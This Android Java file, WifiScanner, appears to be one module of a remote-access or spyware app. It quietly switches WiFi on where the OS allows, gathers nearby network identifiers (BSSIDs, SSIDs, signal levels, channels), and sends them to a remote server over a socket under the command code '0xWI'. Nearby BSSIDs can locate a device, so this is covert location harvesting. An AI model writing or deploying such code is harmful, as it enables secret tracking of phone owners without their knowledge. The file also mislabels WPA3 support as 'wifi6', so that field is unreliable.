package com.fason.app.features.wifi;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.LocationManager;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.Build;

import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Comparator;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

// WiFi network scanner
public final class WifiScanner {

    private static final int MAX = 50;
    private static final long TIMEOUT = 15000;
    private static final AtomicBoolean scanning = new AtomicBoolean(false);
    private static final ExecutorService exec = Executors.newSingleThreadExecutor();
    private static final AtomicReference<JSONArray> cache = new AtomicReference<>();

    private WifiScanner() {}

    // Perform WiFi scan
    public static JSONObject scan(Context ctx) {
        JSONObject result = new JSONObject();
        JSONArray networks = new JSONArray();

        try {
            result.put("networks", networks);

            WifiManager wm = (WifiManager) ctx.getSystemService(Context.WIFI_SERVICE);
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);

            if (wm == null) {
                result.put("error", "WiFi unavailable");
                return result;
            }

            // Check WiFi enabled
            if (!wm.isWifiEnabled()) {
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                    try {
                        wm.setWifiEnabled(true);
                        Thread.sleep(1000);
                    } catch (Exception ignored) {}
                }
                if (!wm.isWifiEnabled()) {
                    result.put("error", "WiFi disabled");
                    return result;
                }
            }

            // Check location permission
            if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
                !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                result.put("error", "Location permission required");
                return result;
            }

            // Check location enabled
            boolean locEnabled = lm != null &&
                (lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                 lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER));

            if (!locEnabled && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                result.put("error", "Location service required");
                return result;
            }

            // Use cache if available
            JSONArray cached = cache.get();
            if (cached != null && cached.length() > 0) {
                result.put("networks", cached);
                result.put("total", cached.length());
                result.put("cached", true);
                return result;
            }

            // Perform async scan
            JSONArray scanResults = asyncScan(ctx, wm);

            if (scanResults != null && scanResults.length() > 0) {
                result.put("networks", scanResults);
                result.put("total", scanResults.length());
                cache.set(scanResults);
            } else {
                // Fallback to system cache
                List<ScanResult> sysResults = wm.getScanResults();
                if (sysResults != null && !sysResults.isEmpty()) {
                    process(sysResults, networks);
                    result.put("total", networks.length());
                    result.put("cached", true);
                } else {
                    result.put("error", "No networks found");
                }
            }

        } catch (Exception e) {
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }

        return result;
    }

    // Async WiFi scan
    private static JSONArray asyncScan(Context ctx, WifiManager wm) {
        if (!scanning.compareAndSet(false, true)) return null;

        CountDownLatch latch = new CountDownLatch(1);
        AtomicReference<JSONArray> results = new AtomicReference<>();

        BroadcastReceiver receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                try {
                    List<ScanResult> scanResults = wm.getScanResults();
                    if (scanResults != null && !scanResults.isEmpty()) {
                        JSONArray nets = new JSONArray();
                        process(scanResults, nets);
                        results.set(nets);
                    }
                } catch (Exception ignored) {}
                latch.countDown();
                scanning.set(false);
                try { ctx.unregisterReceiver(this); } catch (Exception ignored) {}
            }
        };

        try {
            IntentFilter filter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                ctx.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                ctx.registerReceiver(receiver, filter);
            }
        } catch (Exception e) {
            scanning.set(false);
            return null;
        }

        if (!wm.startScan()) {
            try { ctx.unregisterReceiver(receiver); } catch (Exception ignored) {}
            scanning.set(false);
            return null;
        }

        try {
            latch.await(TIMEOUT, TimeUnit.MILLISECONDS);
        } catch (Exception e) {
            try { ctx.unregisterReceiver(receiver); } catch (Exception ignored) {}
        }

        scanning.set(false);
        return results.get();
    }

    // Process scan results
    private static void process(List<ScanResult> scans, JSONArray networks) {
        scans.sort(Comparator.comparingInt((ScanResult s) -> s.level).reversed());

        int limit = Math.min(scans.size(), MAX);
        for (int i = 0; i < limit; i++) {
            ScanResult sr = scans.get(i);
            try {
                JSONObject net = new JSONObject();
                net.put("BSSID", sr.BSSID != null ? sr.BSSID : "");
                net.put("SSID", sr.SSID != null ? sr.SSID : "");
                net.put("level", sr.level);
                net.put("frequency", sr.frequency);
                net.put("signalStrength", calcSignal(sr.level));
                net.put("capabilities", sr.capabilities != null ? sr.capabilities : "");
                net.put("secure", sr.capabilities != null &&
                    (sr.capabilities.contains("WPA") || sr.capabilities.contains("WEP")));
                net.put("channel", freqToChannel(sr.frequency));

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    net.put("wifi6", sr.capabilities != null && sr.capabilities.contains("WPA3"));
                }

                networks.put(net);
            } catch (Exception ignored) {}
        }
    }

    // Calculate signal percentage
    private static int calcSignal(int rssi) {
        int pct = (int) ((rssi + 100) * 100.0 / 70);
        return Math.max(0, Math.min(100, pct));
    }

    // Frequency to channel
    private static int freqToChannel(int freq) {
        if (freq >= 2412 && freq <= 2484) return (freq - 2407) / 5;
        if (freq >= 5170 && freq <= 5825) return (freq - 5170) / 5 + 34;
        return freq;
    }

    // Clear cache
    public static void clearCache() {
        cache.set(null);
    }

    // Scan and emit
    public static void scanAndEmit(Context ctx) {
        exec.execute(() -> {
            JSONObject result = scan(ctx);
            SocketClient.getInstance().getSocket().emit("0xWI", result);
        });
    }
}
